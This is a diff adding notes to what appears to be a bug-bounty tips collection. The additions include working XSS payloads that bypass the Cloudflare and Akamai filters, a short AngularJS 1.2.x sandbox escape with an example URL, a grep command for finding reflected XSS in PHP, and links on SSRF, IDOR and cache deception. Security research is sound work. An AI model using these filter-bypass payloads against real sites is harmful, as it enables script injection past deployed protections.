@@ -243,6 +243,64 @@ which will send request to `yahoo` instead of `google`
 <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
 <svg%0Aonauxclick=0;[1].some(confirm)//
 ```
----
+
+## SSRF on image Renderer
+***https://hackerone.com/reports/811136***
+
+## Cloudflare XSS Bypass via add 8 or more superfluous leading zeros for dec and 7 or more for hex.
+```js
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+```
+
+## Hunt for Low Hanging Fruits 
+If you're hunting for low-hanging bugs in source code, grep and regex can help you to identify hotspots. For example, you might find basic rXSS in PHP with something like this:
+```sh
+grep -r "echo.*\$_\(GET\|REQUEST\|POST\)" 
+```
+
+## site-wide, target specific Akamai XSS Bypass 
+The word "javascript" is removed in all reflection contexts, which can be abused to craft Akamai bypasses:
+```js
+<ijavascriptmg+src+ojavascriptnerror=confirm(1)>
+````
+⬇️
+```js
+<img src onerror=confirm(1)>
+```
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_)
+- [Learn365](https://github.com/harsh-bothra/learn365)
+- [Session Puzzling Attack](https://twitter.com/harshbothra_/status/1350741817243918336?s=20)
+- [Web Cache Deception Attack](https://twitter.com/harshbothra_/status/1350374481231970305?s=20)
+- [Websocket Vuls Part -1](https://twitter.com/harshbothra_/status/1349363147023372290?s=20)
+- [Websocket Vuls Part -2](https://twitter.com/harshbothra_/status/1349769962043236357?s=20)
+- [Websocket Vuls Part -3](https://twitter.com/harshbothra_/status/1350109203671597056?s=20)
+
+## Apple IDOR Vulnerability
+- [Apple IDOR via `X-Dsid`](https://twitter.com/samwcyo/status/1350025967331389442?s=20)
+
+## Tiny sandbox escape for AngularJS 1.2.24 - 1.2.29
+Need a tiny sandbox escape for AngularJS 1.2.24 - 1.2.29? I think this is the shortest possible. 19 characters.
+```js
+{{[]."-alert`1`-"}}
+````
+**Example**
+```text
+https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.26&x={{[].%22-alert`1`-%22}}
+```
+[![img](https://pbs.twimg.com/media/Eryi6dEXEAEykzE?format=png&name=small)](https://twitter.com/PortSwiggerRes/status/1350134023016902657?s=20)
+
+## Infosec Matter Bug Biunty Tips
+- https://www.infosecmatter.com/bug-bounty-tips-1/
+- https://www.infosecmatter.com/bug-bounty-tips-2-jun-30/
+- https://www.infosecmatter.com/bug-bounty-tips-3-jul-21/
+- https://www.infosecmatter.com/bug-bounty-tips-4-aug-03/
+- https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/
+- https://www.infosecmatter.com/bug-bounty-tips-6-sep-07/
+- https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/
+- https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/
+- https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/
+- https://www.infosecmatter.com/bug-bounty-tips-10-dec-24/
 
 
